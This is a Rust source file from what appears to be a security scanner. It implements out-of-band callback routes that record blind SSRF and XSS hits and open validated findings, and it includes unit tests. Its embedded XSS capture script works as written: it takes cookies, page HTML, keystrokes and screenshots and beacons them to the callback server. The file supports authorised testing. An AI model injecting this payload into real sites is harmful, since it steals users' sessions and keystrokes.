//! OOB (out-of-band) callback HTTP routes.
//!
//! Two route groups:
//!   * `/oob/:secret` — the public callback receiver (no auth; anyone with
//!     the secret can hit it). Captures the full request as JSON and stores it.
//!   * `/api/v1/oob-handlers` — CRUD for handlers (auth required).

use crate::access::{require_workspace, workspace_visible, WorkspacePermission};
use crate::auth::extractor::CurrentUser;
use crate::error::{ApiError, ApiResult};
use crate::state::SharedState;
use axum::body::Bytes;
use axum::extract::{Path, Query, Request, State};
use axum::http::StatusCode;
use axum::response::IntoResponse;
use axum::Json;
use serde::Deserialize;
use serde_json::{json, Value};

pub fn router() -> axum::Router<SharedState> {
    // Public callback receiver (no auth).
    let public = axum::Router::new().route("/oob/:secret", axum::routing::any(receive_callback));

    // Authed CRUD.
    let authed = axum::Router::new()
        .route("/oob-handlers", axum::routing::get(list).post(create))
        .route(
            "/oob-handlers/:id",
            axum::routing::get(get_one).delete(delete),
        )
        .route("/oob-handlers/:id/hits", axum::routing::get(list_hits))
        .route(
            "/oob-handlers/:id/hits/clear",
            axum::routing::post(clear_hits),
        );

    public.merge(authed)
}

fn handler_to_json(h: &secuscan_db::models::OobHandlerRow, include_secret: bool) -> Value {
    let mut out = json!({
        "id": h.id,
        "workspace_id": h.workspace_id,
        "user_id": h.user_id,
        "name": h.name,
        "kind": h.kind,
        "config": serde_json::from_str::<Value>(&h.config_json).unwrap_or(json!({})),
        "callback_url": format!("/api/v1/oob/{}", h.secret),
        "expires_at": h.expires_at,
        "created_at": h.created_at,
        "hit_count": h.hit_count,
        "last_hit_at": h.last_hit_at,
    });
    if include_secret {
        out["secret"] = json!(h.secret);
    }
    out
}

fn hit_to_json(h: &secuscan_db::models::OobHitRow) -> Value {
    json!({
        "id": h.id,
        "handler_id": h.handler_id,
        "task_id": h.task_id,
        "payload": serde_json::from_str::<Value>(&h.payload_json).unwrap_or(json!({})),
        "received_at": h.received_at,
    })
}

#[derive(Deserialize, Default)]
struct ListQuery {
    #[serde(default)]
    workspace_id: Option<String>,
}

async fn list(
    State(state): State<SharedState>,
    user: CurrentUser,
    Query(q): Query<ListQuery>,
) -> ApiResult<Json<Value>> {
    if let Some(ws) = q.workspace_id.as_deref() {
        require_workspace(&state, &user, ws, WorkspacePermission::Read).await?;
    }
    let rows = secuscan_db::repo::oob::list_handlers(&state.db, q.workspace_id.as_deref()).await?;
    let mut items = Vec::new();
    for h in &rows {
        if !crate::access::is_owner_or_admin(&user, &h.user_id) {
            continue;
        }
        if let Some(ws) = h.workspace_id.as_deref() {
            if !workspace_visible(&state, &user, ws).await? {
                continue;
            }
        }
        items.push(handler_to_json(h, false));
    }
    Ok(Json(json!({ "items": items })))
}

#[derive(Deserialize)]
struct CreateHandlerRequest {
    #[serde(default)]
    workspace_id: Option<String>,
    name: String,
    kind: String,
    #[serde(default)]
    config: Value,
    /// TTL in seconds (default 60 days = 5184000).
    #[serde(default)]
    ttl_seconds: Option<i64>,
}

async fn create(
    State(state): State<SharedState>,
    user: CurrentUser,
    Json(req): Json<CreateHandlerRequest>,
) -> ApiResult<(StatusCode, Json<Value>)> {
    user.require_scanner()?;
    if let Some(ws) = &req.workspace_id {
        require_workspace(&state, &user, ws, WorkspacePermission::Write).await?;
    }
    let config_json = serde_json::to_string(&req.config).unwrap_or_else(|_| "{}".into());
    let ttl = req.ttl_seconds.unwrap_or(60 * 24 * 3600);
    let row = secuscan_db::repo::oob::create_handler(
        &state.db,
        req.workspace_id.as_deref(),
        &user.0.id,
        &req.name,
        &req.kind,
        &config_json,
        ttl,
    )
    .await?;
    Ok((StatusCode::CREATED, Json(handler_to_json(&row, true))))
}

async fn get_one(
    State(state): State<SharedState>,
    user: CurrentUser,
    Path(id): Path<String>,
) -> ApiResult<Json<Value>> {
    let row = secuscan_db::repo::oob::get_handler(&state.db, &id).await?;
    crate::access::require_owner(&user, &row.user_id)?;
    if let Some(ws) = row.workspace_id.as_deref() {
        require_workspace(&state, &user, ws, WorkspacePermission::Read).await?;
    }
    Ok(Json(handler_to_json(&row, true)))
}

async fn delete(
    State(state): State<SharedState>,
    user: CurrentUser,
    Path(id): Path<String>,
) -> ApiResult<StatusCode> {
    user.require_scanner()?;
    let row = secuscan_db::repo::oob::get_handler(&state.db, &id).await?;
    crate::access::require_owner(&user, &row.user_id)?;
    if let Some(ws) = row.workspace_id.as_deref() {
        require_workspace(&state, &user, ws, WorkspacePermission::Write).await?;
    }
    secuscan_db::repo::oob::delete_handler(&state.db, &id).await?;
    Ok(StatusCode::NO_CONTENT)
}

#[derive(Deserialize, Default)]
struct ListHitsQuery {
    #[serde(default)]
    limit: Option<u32>,
}

async fn list_hits(
    State(state): State<SharedState>,
    user: CurrentUser,
    Path(id): Path<String>,
    Query(q): Query<ListHitsQuery>,
) -> ApiResult<Json<Value>> {
    let handler = secuscan_db::repo::oob::get_handler(&state.db, &id).await?;
    crate::access::require_owner(&user, &handler.user_id)?;
    if let Some(ws) = handler.workspace_id.as_deref() {
        require_workspace(&state, &user, ws, WorkspacePermission::Read).await?;
    }
    let limit = q.limit.unwrap_or(100);
    let rows = secuscan_db::repo::oob::list_hits(&state.db, &id, limit).await?;
    Ok(Json(json!({
        "items": rows.iter().map(hit_to_json).collect::<Vec<_>>(),
    })))
}

async fn clear_hits(
    State(state): State<SharedState>,
    user: CurrentUser,
    Path(id): Path<String>,
) -> ApiResult<StatusCode> {
    user.require_scanner()?;
    let handler = secuscan_db::repo::oob::get_handler(&state.db, &id).await?;
    crate::access::require_owner(&user, &handler.user_id)?;
    if let Some(ws) = handler.workspace_id.as_deref() {
        require_workspace(&state, &user, ws, WorkspacePermission::Write).await?;
    }
    secuscan_db::repo::oob::clear_hits(&state.db, &id).await?;
    Ok(StatusCode::NO_CONTENT)
}

// --- public callback receiver ---------------------------------------------

/// Max recorded hits per handler (Sprint 1.2: the cap existed as an idea but
/// was never enforced — one noisy target could fill the DB unbounded).
const MAX_HITS_PER_HANDLER: i64 = 500;

/// Max body bytes accepted per hit (matches the capture read below).
const MAX_HIT_BODY_BYTES: usize = 64 * 1024;

/// One-time browser capture script served for `GET /oob/:secret` without
/// data params. Beacons are relative to the script URL, so the payload works
/// regardless of which host serves it; the task marker rides along from the
/// query string. `__CFG__` is replaced with a compact JSON config object.
const PAYLOAD_TEMPLATE: &str = r#"(function(){
var CFG=__CFG__;
var m=new URLSearchParams(location.search).get('m')||'';
function u(t,d){return location.pathname+'?m='+encodeURIComponent(m)+'&t='+encodeURIComponent(t)+'&d='+encodeURIComponent(d);}
function get(t,d){try{new Image().src=u(t,d).slice(0,2000);}catch(e){}}
function post(t,d){try{navigator.sendBeacon(location.pathname+'?m='+encodeURIComponent(m)+'&t='+encodeURIComponent(t),d);}catch(e){}}
if(CFG.c){get('cookies',document.cookie||'(none)');}
if(CFG.h){get('html',(document.documentElement&&document.documentElement.outerHTML||'').slice(0,1200));}
if(CFG.k){var buf=[];document.addEventListener('keydown',function(e){try{buf.push(Date.now()+':'+e.key);}catch(x){}});
setInterval(function(){if(buf.length){post('keys',buf.join('\n').slice(0,40000));buf=[];}},3000);
window.addEventListener('pagehide',function(){if(buf.length){post('keys',buf.join('\n').slice(0,40000));buf=[];}});}
if(CFG.s){setTimeout(function(){try{var s=document.createElement('script');
s.src='https://unpkg.com/html2canvas@1.4.1/dist/html2canvas.min.js';
s.onload=function(){try{html2canvas(document.body).then(function(c){try{post('shot',c.toDataURL('image/png').slice(0,60000));}catch(e){post('shot','(canvas blocked)');}},function(){post('shot','(render failed)');});}catch(e){}};
s.onerror=function(){post('shot','(html2canvas unavailable)');};
(document.body||document.documentElement).appendChild(s);}catch(e){}},800);}
get('ping','1');
})();
"#;

/// Build the browser capture script from the handler's stored config.
fn build_payload_js(config_json: &str) -> String {
    let cfg: Value = serde_json::from_str(config_json).unwrap_or(json!({}));
    let flag = |k: &str| cfg.get(k).and_then(Value::as_bool).unwrap_or(false);
    let compact = json!({
        "c": flag("capture_cookies"),
        "h": flag("capture_html"),
        "k": flag("capture_keystrokes"),
        "s": flag("capture_screenshot"),
    });
    PAYLOAD_TEMPLATE.replace("__CFG__", &compact.to_string())
}

fn oob_response(status: StatusCode) -> axum::response::Response {
    use axum::http::header::{ACCESS_CONTROL_ALLOW_ORIGIN, CACHE_CONTROL};
    (
        status,
        [
            (ACCESS_CONTROL_ALLOW_ORIGIN, "*"),
            (CACHE_CONTROL, "no-store"),
        ],
    )
        .into_response()
}

/// A GET for the capture script itself: classic `<script src>` sends
/// `Sec-Fetch-Dest: script`; the fetch+eval snippet sends
/// `Accept: application/javascript` (the scanner-built payload sets it).
/// Everything else — bare curl/SSRF callbacks, GET beacons with `?d=`,
/// sendBeacon POSTs — records a hit. Serving is silent; execution pings
/// back via `t=ping`, which is what actually proves the payload ran.
fn is_payload_fetch(method: &str, uri: &str, headers: &axum::http::HeaderMap) -> bool {
    if method != "GET" {
        return false;
    }
    let has_data = uri
        .split(['?', '&'])
        .any(|p| p.starts_with("d=") || p.starts_with("t="));
    if has_data {
        return false;
    }
    let fetch_dest_script = headers
        .get("sec-fetch-dest")
        .and_then(|v| v.to_str().ok())
        .map(|v| v == "script")
        .unwrap_or(false);
    let accept_js = headers
        .get("accept")
        .and_then(|v| v.to_str().ok())
        .map(|v| v.to_ascii_lowercase().contains("javascript"))
        .unwrap_or(false);
    fetch_dest_script || accept_js
}

async fn receive_callback(
    State(state): State<SharedState>,
    Path(secret): Path<String>,
    req: Request,
) -> Result<axum::response::Response, ApiError> {
    // Look up the handler by secret.
    let handler = secuscan_db::repo::oob::get_handler_by_secret(&state.db, &secret)
        .await?
        .ok_or_else(|| ApiError::NotFound("no such OOB handler".into()))?;
    if let Ok(exp) = chrono::DateTime::parse_from_rfc3339(&handler.expires_at) {
        if exp.with_timezone(&chrono::Utc) < chrono::Utc::now() {
            return Err(ApiError::NotFound("OOB handler expired".into()));
        }
    }

    let (parts, body) = req.into_parts();
    let method = parts.method.as_str().to_string();
    let uri = parts.uri.to_string();

    // Max-Parity Sprint 1.2 (2.1): serve the live capture script.
    if is_payload_fetch(&method, &uri, &parts.headers) {
        use axum::http::header::{ACCESS_CONTROL_ALLOW_ORIGIN, CACHE_CONTROL, CONTENT_TYPE};
        let js = build_payload_js(&handler.config_json);
        return Ok((
            [
                (CONTENT_TYPE, "application/javascript; charset=utf-8"),
                (ACCESS_CONTROL_ALLOW_ORIGIN, "*"),
                (CACHE_CONTROL, "no-store"),
            ],
            js,
        )
            .into_response());
    }

    // Hit cap: reject new hits once the handler is full.
    if handler.hit_count >= MAX_HITS_PER_HANDLER {
        return Ok(oob_response(StatusCode::TOO_MANY_REQUESTS));
    }

    let body_bytes: Bytes = axum::body::to_bytes(body, MAX_HIT_BODY_BYTES)
        .await
        .map_err(|e| ApiError::BadRequest(format!("read body: {e}")))?;
    let headers: serde_json::Map<String, Value> = parts
        .headers
        .iter()
        .map(|(k, v)| {
            (
                k.as_str().to_string(),
                Value::String(v.to_str().unwrap_or("").to_string()),
            )
        })
        .collect();
    let source_ip = parts
        .headers
        .get("x-forwarded-for")
        .and_then(|v| v.to_str().ok())
        .map(|s| s.split(',').next().unwrap_or("").trim().to_string())
        .or_else(|| {
            parts
                .headers
                .get("x-real-ip")
                .and_then(|v| v.to_str().ok())
                .map(String::from)
        })
        .unwrap_or_default();
    let user_agent = parts
        .headers
        .get("user-agent")
        .and_then(|v| v.to_str().ok())
        .unwrap_or("")
        .to_string();

    // Try to extract the OOB marker from query/body to correlate with a task.
    let marker = extract_marker(&uri, &body_bytes);
    let task_id: Option<String> = if let Some(ref m) = marker {
        sqlx::query_scalar::<_, Option<String>>("SELECT id FROM tasks WHERE oob_marker = ? LIMIT 1")
            .bind(m)
            .fetch_optional(&state.db)
            .await
            .ok()
            .flatten()
            .flatten()
    } else {
        None
    };

    let payload = json!({
        "source_ip": source_ip,
        "method": method,
        "url": uri,
        "headers": Value::Object(headers),
        "body": String::from_utf8_lossy(&body_bytes).to_string(),
        "user_agent": user_agent,
        "marker": marker,
        // Self-describing beacons: the capture script tags each stream with
        // `?t=<type>&d=<data>` so hits are queryable without URL parsing.
        "stream": uri.split(['?', '&']).find(|p| p.starts_with("t=")).map(|p| p[2..].to_string()),
        "data": uri.split(['?', '&']).find(|p| p.starts_with("d=")).map(|p| p[2..].to_string()),
    });
    let payload_json = serde_json::to_string(&payload).unwrap_or_else(|_| "{}".into());

    let hit = secuscan_db::repo::oob::record_hit(
        &state.db,
        &handler.id,
        task_id.as_deref(),
        &payload_json,
    )
    .await?;

    // Max-Parity Sprint 1.2 (2.5): a marker-correlated hit IS the proof —
    // open a validated finding on the originating task automatically.
    if let Some(task_id) = &task_id {
        if let Err(e) = open_oob_finding(&state, &handler, task_id, &hit).await {
            tracing::warn!("auto-finding for OOB hit {} failed: {e}", hit.id);
        }
    }

    Ok(oob_response(StatusCode::OK))
}

/// Insert the validated finding for a correlated OOB hit, mirroring the
/// manager's insertion pipeline (FP-memory suppression + dedup group attach)
/// so OOB findings behave identically to scanner findings downstream.
async fn open_oob_finding(
    state: &SharedState,
    handler: &secuscan_db::models::OobHandlerRow,
    task_id: &str,
    hit: &secuscan_db::models::OobHitRow,
) -> Result<(), String> {
    let task = secuscan_db::repo::tasks::get(&state.db, task_id)
        .await
        .map_err(|e| format!("load task: {e}"))?;

    let payload: Value =
        serde_json::from_str(&hit.payload_json).unwrap_or_else(|_| json!({}));
    let hit_url = payload
        .get("url")
        .and_then(Value::as_str)
        .unwrap_or("")
        .to_string();
    let stream = payload
        .get("stream")
        .and_then(Value::as_str)
        .unwrap_or("interaction")
        .to_string();

    let (title, description) = match handler.kind.as_str() {
        "xss_exploiter" => (
            "XSS payload executed (OOB callback)".to_string(),
            format!(
                "A browser evaluated the injected payload and beaconed back to the \
                 handler `{name}` (stream: {stream}). This is controlled proof of \
                 execution — the script can only reach the callback if it ran in a \
                 victim context.\n\nStream: {stream}\nHandler: {name}\nHit: {hit_id}",
                name = handler.name,
                hit_id = hit.id,
            ),
        ),
        _ => (
            "Out-of-band interaction confirmed (blind SSRF/XXE/injection)".to_string(),
            format!(
                "The target made an outbound request to the OOB handler `{name}` \
                 (stream: {stream}). A callback that the target could only produce \
                 by resolving/fetching our URL confirms a blind interaction channel \
                 (SSRF, XXE, blind SQLi, or command execution depending on where the \
                 URL was planted).\n\nStream: {stream}\nHandler: {name}\nHit: {hit_id}",
                name = handler.name,
                hit_id = hit.id,
            ),
        ),
    };

    let proof = format!(
        "source_ip: {}\nmethod: {}\nurl: {}\nuser_agent: {}\nbody: {}",
        payload.get("source_ip").and_then(Value::as_str).unwrap_or(""),
        payload.get("method").and_then(Value::as_str).unwrap_or(""),
        hit_url,
        payload.get("user_agent").and_then(Value::as_str).unwrap_or(""),
        payload
            .get("body")
            .and_then(Value::as_str)
            .map(|b| b.chars().take(400).collect::<String>())
            .unwrap_or_default(),
    );

    let finding = secuscan_core::models::Finding {
        title,
        category: "OOB Callback".into(),
        severity: secuscan_core::models::Severity::High,
        kind: secuscan_core::models::FindingKind::ValidatedIssue,
        description,
        remediation: "Treat the interaction as confirmed exploitation of the injection \
                      point that referenced the callback URL. Identify and fix the sink; \
                      rotate any captured session material; delete the handler once the \
                      engagement wraps."
            .into(),
        proof,
        url: (!hit_url.is_empty()).then(|| {
            // Strip our own query params; the target URL is what matters.
            hit_url.split('?').next().unwrap_or(&hit_url).to_string()
        }),
        metadata: json!({
            "handler_id": handler.id,
            "handler_kind": handler.kind,
            "hit_id": hit.id,
            "stream": stream,
            "marker": payload.get("marker"),
        }),
        confidence: Some("certain".into()),
        ..Default::default()
    };

    // Duplicate guard: the first correlated hit opens the finding; repeated
    // beacons just accumulate as hits (and would dedup to the same group).
    let existing: Option<String> = sqlx::query_scalar(
        "SELECT id FROM findings WHERE task_id = ? AND title = ? LIMIT 1",
    )
    .bind(task_id)
    .bind(&finding.title)
    .fetch_optional(&state.db)
    .await
    .ok()
    .flatten();
    if existing.is_some() {
        return Ok(());
    }

    // FP-memory check (same rule as scanner findings).
    let plugin_id = "oob-callback";
    let fp_target = secuscan_db::repo::finding_dedup::target_fingerprint(
        finding.url.as_deref(),
        task.target.as_deref(),
    );
    let fp = secuscan_db::repo::finding_dedup::is_remembered_false_positive(
        &state.db,
        task.workspace_id.as_deref(),
        plugin_id,
        &finding.title,
        &fp_target,
    )
    .await
    .ok()
    .flatten();

    let inserted = secuscan_db::repo::findings::insert_many(
        &state.db,
        task_id,
        plugin_id,
        std::slice::from_ref(&finding),
    )
    .await
    .map_err(|e| format!("insert finding: {e}"))?;

    if let Some(row_id) = inserted.first() {
        if let Ok(group) = secuscan_db::repo::finding_dedup::find_or_create_group(
            &state.db,
            task.workspace_id.as_deref(),
            plugin_id,
            &finding.title,
            &fp_target,
        )
        .await
        {
            let _ = sqlx::query("UPDATE findings SET group_id = ? WHERE id = ?")
                .bind(&group.id)
                .bind(row_id)
                .execute(&state.db)
                .await;
            if fp.is_some() {
                let _ = sqlx::query(
                    "UPDATE findings SET analyst_status = 'false_positive' WHERE id = ?",
                )
                .bind(row_id)
                .execute(&state.db)
                .await;
            }
        }
    }

    tracing::info!(
        "OOB hit {} on handler {} opened a validated finding for task {}",
        hit.id,
        handler.id,
        task_id
    );
    Ok(())
}


fn extract_marker(uri: &str, body: &[u8]) -> Option<String> {
    // Look for "ptt" followed by 12 hex chars in the URL or body.
    let re = regex::Regex::new(r"ptt[0-9a-f]{12}").ok()?;
    let uri_match = re.find(uri).map(|m| m.as_str().to_string());
    if uri_match.is_some() {
        return uri_match;
    }
    let body_str = std::str::from_utf8(body).ok()?;
    re.find(body_str).map(|m| m.as_str().to_string())
}

#[cfg(test)]
mod tests {
    use super::*;
    use axum::http::HeaderMap;

    fn headers(kvs: &[(&str, &str)]) -> HeaderMap {
        let mut m = HeaderMap::new();
        for (k, v) in kvs {
            m.insert(
                axum::http::HeaderName::from_bytes(k.as_bytes()).unwrap(),
                axum::http::HeaderValue::from_str(v).unwrap(),
            );
        }
        m
    }

    #[test]
    fn payload_fetch_requires_script_or_js_accept() {
        // Classic <script src> — Sec-Fetch-Dest: script.
        assert!(is_payload_fetch(
            "GET",
            "/api/v1/oob/abc?m=ptt000000000000",
            &headers(&[("sec-fetch-dest", "script")])
        ));
        // fetch_eval snippet — Accept: application/javascript.
        assert!(is_payload_fetch(
            "GET",
            "/api/v1/oob/abc",
            &headers(&[("accept", "application/javascript")])
        ));
        // Bare curl/SSRF callback: a HIT, not the script.
        assert!(!is_payload_fetch("GET", "/api/v1/oob/abc", &headers(&[])));
        // Data beacons: always hits.
        assert!(!is_payload_fetch(
            "GET",
            "/api/v1/oob/abc?m=ptt000000000000&t=cookies&d=x",
            &headers(&[("sec-fetch-dest", "script")])
        ));
        assert!(!is_payload_fetch("POST", "/api/v1/oob/abc?t=keys", &headers(&[])));
    }

    #[test]
    fn payload_carries_config_flags_and_relative_beacons() {
        let js = build_payload_json_test(r#"{"capture_cookies":true,"capture_html":false,"capture_keystrokes":true,"capture_screenshot":false}"#);
        assert!(js.contains("document.cookie"), "cookies capture present");
        assert!(js.contains("outerHTML"), "html capture code present (guarded by CFG)");
        assert!(js.contains("keydown"), "keystroke listener present");
        assert!(!js.contains("\"s\":true"), "screenshot disabled");
        assert!(js.contains("location.pathname"), "beacons are relative (host-agnostic)");
        assert!(js.contains("get('ping','1')"), "execution ping present");
    }

    fn build_payload_json_test(config_json: &str) -> String {
        build_payload_js(config_json)
    }

    #[test]
    fn disabled_flags_omit_active_capture() {
        let js = build_payload_js("{}");
        assert!(js.contains("\"c\":false"));
        assert!(js.contains("\"k\":false"));
    }

    #[test]
    fn marker_extraction_finds_ptt_marker() {
        assert_eq!(
            extract_marker("/api/v1/oob/x?m=pttabcdef123456&d=1", b""),
            Some("pttabcdef123456".to_string())
        );
        assert_eq!(extract_marker("/api/v1/oob/x", b"body ptt0123456789ab"), Some("ptt0123456789ab".to_string()));
        assert_eq!(extract_marker("/api/v1/oob/x", b"no marker here"), None);
    }
}
